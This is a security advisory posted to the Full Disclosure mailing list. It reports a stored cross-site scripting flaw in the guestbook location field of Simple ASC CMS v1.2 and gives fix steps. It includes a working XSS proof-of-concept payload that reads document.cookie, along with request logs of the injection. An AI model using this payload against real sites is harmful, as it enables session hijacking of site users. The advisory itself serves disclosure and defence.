
Date: Tue, 23 May 2017 10:21:33 +0200
From: Vulnerability Lab <research@...nerability-lab.com>
To: fulldisclosure@...lists.org
Subject: [FD] Simple ASC CMS v1.2 - (Guestbook) Persistent Vulnerability

Document Title:
===============
Simple ASC CMS v1.2 - (Guestbook) Persistent Vulnerability


References (Source):
====================
https://www.vulnerability-lab.com/get_content.php?id=2072


Release Date:
=============
2017-05-21


Vulnerability Laboratory ID (VL-ID):
====================================
2072


Common Vulnerability Scoring System:
====================================
3.8


Vulnerability Class:
====================
Cross Site Scripting - Persistent


Product & Service Introduction:
===============================
Simple ASC CMS permit to create websites in minutes with its dynamic genaration of news menus links and pages. It use Access 
Database and is simple to install. There is admin panel where you can manage all features. Provide advanced features as Polls 
Forum and Guestbook. No need to install third parts components.

(COpy of the Homepage: http://www.aspsource.org/home/default.asp )


Abstract Advisory Information:
==============================
The vulnerability laboratory core research team discovered a stored cross site scripting vulnerability in the Simple ASC v1.2 CMS.


Vulnerability Disclosure Timeline:
==================================
2017-05-22: Public Disclosure (Vulnerability Laboratory)


Discovery Status:
=================
Published


Affected Product(s):
====================
ASP Source Community
Product: Simple ASP - Content Management System (Web-Application) 1.2


Exploitation Technique:
=======================
Remote


Severity Level:
===============
Medium


Technical Details & Description:
================================
A stored cross site scripting vulnerability has been discovered in the official Simple ASC v1.2 Content Management System.
The vulnerability allows remote attackers to inject own malicious script code on application-side to compromise the affected 
function or module of the online service web-application.

The stored cross site scripting vulnerability is located in the `location` input field in the `sign` function of the guestbook.
Remote attackers are able to inject own malicious script code via location parameter by a POST method request. The attack vector 
of the vulnerability is persistent and the request method to inject is POST. The injection point is the vulnerable location input 
field and the execution point occurs in the guestbook index. The vulnerable and affected files of the guestbook module are 
`formgb.asp`, `msggb.asp` and `guestbook.asp`.

The security risk of the vulnerability is estimated as medium with a cvss (common vulnerability scoring system) count of 3.8.
Exploitation of the cross site vulnerability requires no privileged web-application user account and low user interaction. 
Successful exploitation results in session hijacking, persistent phishings attacks, persistent external redirect and malware 
loads or persistent manipulation of affected and connected module context.

Request Method(s):
[+] POST

Vulnerable Service(s):
[+] Guestbook

Vulnerable File(s):
[+] formgb.asp
[+] msggb.asp

Vulnerable Input Field(s):
[+] Location

Vulnerable Parameter(s):
[+] location

Affected Module(s):
[+] guestbook.asp


Proof of Concept (PoC):
=======================
The vulnerability can be exploited by remote attackers without privileged user account and with low user interaction.
For security demonstration or to reproduce the vulnerability follow the provided information and steps below to continue.


Manual steps to reproduce the vulnerability ...
1. Open the web-application
2. Move to the integrated guestbook
3. Click to sign the guestbook
4. Inject the payload to the location input field to the guestbook formgb.asp file
5. Save the entry by a click to sign via POST method
6. The payload executes in the location parameter for all users of the content management system
7. Successful reproduce of the stored cross site scripting vulnerability!


PoC: Payload
<iframe src="http://www.vuln-lab.com" onload="alert(document.cookie)" <=""> 


PoC: Vulnerable Source
<tbody><tr><td colspan="2" class="par"></td></tr>
    <tr><td colspan="3" align="center"><b><a href="formgb.asp">Sign Guestbook</a></b></td></tr>
    <tr><td>&nbsp;</td></tr>
     <tr><td>
       <a href="guestbook.asp?pag=1">1</a>
       <a href="guestbook.asp?pag=2">2</a>
         </td></tr>
    <tr class="prgb"><td align="left">
tester32 | &gt;"[MALICIOUS PAYLOAD EXECUTION!]<iframe src="http://www.vuln-lab.com" onload="alert(document.cookie)" <=""> 
        &nbsp;<a href="mailto:pto@...il.com"><img src="./imm/Email-Reply-icon.png" /></a>
    &nbsp;<font size="1">**/**/2017 **:**:** AM</font></td>
    </tr>
        <tr><td><p>like it</p></td></tr>
        <tr><td>&nbsp;</td></tr>


--- PoC Session Logs [POST] ---
Status: 302[Object moved]
POST http://localhost:8080/asccms/msggb.asp
Mime Type[text/html]
   Request Header:
      Host[localhost:8080]
      User-Agent[Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Content-Type[application/x-www-form-urlencoded]
      Content-Length[267]
      Referer[http://localhost:8080/asccms/formgb.asp]
      Cookie[ASPSESSIONIDAARCTTBT=NGDHMDMABACBBJGMEHOJHSGE]
      Connection[keep-alive]
      Upgrade-Insecure-Requests[1]
   POST-Daten:
      nick[tester32]
      email[test32%40test.de]
      loc[%3E%22%3Ciframe+src%3Dhttp%3A%2F%2Fwww.vuln-lab.com+onload%3Dalert%28document.cookie%29+%3C+++
	%3E%22%3Ciframe+src%3Dhttp%3A%2F%2Fwww.vuln-lab.com+onload%3Dalert%28document.cookie%29+%3C MALICIOUS INJECTED PAYLOAD!]
      txtmsg[%3Cp%3Elike+it%3C%2Fp%3E]
      inum[10]
   Response Header:
      Cache-Control[private]
      Content-Length[134]
      Content-Type[text/html]
      Location[guestbook.asp]
      Server[Microsoft-IIS/7.5]
      X-Powered-By[ASP.NET]
-
Status: 200[OK]
GET http://localhost:8080/asccms/guestbook.asp 
Mime Type[text/html]
   Request Header:
      Host[localhost:8080]
      User-Agent[Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0]
      Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
      Referer[http://localhost:8080/asccms/formgb.asp]
      Cookie[ASPSESSIONIDAARCTTBT=NGDHMDMABACBBJGMEHOJHSGE]
      Connection[keep-alive]
      Upgrade-Insecure-Requests[1]
   Response Header:
      Cache-Control[private]
      Content-Type[text/html]
      Content-Encoding[gzip]
      Vary[Accept-Encoding]
      Server[Microsoft-IIS/7.5]
      X-Powered-By[ASP.NET]
      Content-Length[1354]


Reference(s):
http://localhost:8080/
http://localhost:8080/asccms/
http://localhost:8080/asccms/msggb.asp
http://localhost:8080/asccms/formgb.asp
http://localhost:8080/asccms/guestbook.asp


Solution - Fix & Patch:
=======================
1. Parse in all the files the location parameter via escape
2. Restrict the input field of the location by disallowing the usage of special chars to prevent attacks
3. Parse the location output in the main index of the guestbook to prevent the execution point
4. Setup a secure exception-handling and use entities to prevent further script code injection attacks


Security Risk:
==============
The security risk of the persistent input validation vulnerability in the guestbook module of the acs application is estimated as medium (CVSS 3.8).


Credits & Authors:
==================
Vulnerability Laboratory [Research Team] - Benjamin Kunz Mejri (http://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.)


Disclaimer & Information:
=========================
The information provided in this advisory is provided as it is without any warranty. Vulnerability Lab disclaims all warranties, either expressed or 
implied, including the warranties of merchantability and capability for a particular purpose. Vulnerability-Lab or its suppliers are not liable in any 
case of damage, including direct, indirect, incidental, consequential loss of business profits or special damages, even if Vulnerability Labs or its 
suppliers have been advised of the possibility of such damages. Some states do not allow the exclusion or limitation of liability mainly for incidental
or consequential damages so the foregoing limitation may not apply. We do not approve or encourage anybody to break any licenses, policies, deface 
websites, hack into databases or trade with stolen data. We have no need for criminal activities or membership requests. We do not publish advisories 
or vulnerabilities of religious-, militant- and racist- hacker/analyst/researcher groups or individuals. We do not publish trade researcher mails, 
phone numbers, conversations or anything else to journalists, investigative authorities or private individuals. 

Domains:    www.vulnerability-lab.com		- www.vulnerability-db.com					- www.evolution-sec.com
Programs:   vulnerability-lab.com/submit.php 	- vulnerability-lab.com/list-of-bug-bounty-programs.php 	- vulnerability-lab.com/register.php
Feeds:	    vulnerability-lab.com/rss/rss.php 	- vulnerability-lab.com/rss/rss_upcoming.php 			- vulnerability-lab.com/rss/rss_news.php
Social:	    twitter.com/vuln_lab		- facebook.com/VulnerabilityLab 				- youtube.com/user/vulnerability0lab

Any modified copy or reproduction, including partially usages, of this file, resources or information requires authorization from Vulnerability Laboratory. 
Permission to electronically redistribute this alert in its unmodified form is granted. All other rights, including the use of other media, are reserved by 
Vulnerability Lab Research Team or its suppliers. All pictures, texts, advisories, source code, videos and other information on this website is trademark 
of vulnerability-lab team & the specific authors or managers. To record, list, modify, use or edit our material contact (admin@) to get an ask permission.

				    Copyright © 2017 | Vulnerability Laboratory - [Evolution Security GmbH]™



-- 
VULNERABILITY LABORATORY - RESEARCH TEAM
SERVICE: www.vulnerability-lab.com



_______________________________________________
Sent through the Full Disclosure mailing list
https://nmap.org/mailman/listinfo/fulldisclosure
Web Archives & RSS: http://seclists.org/fulldisclosure/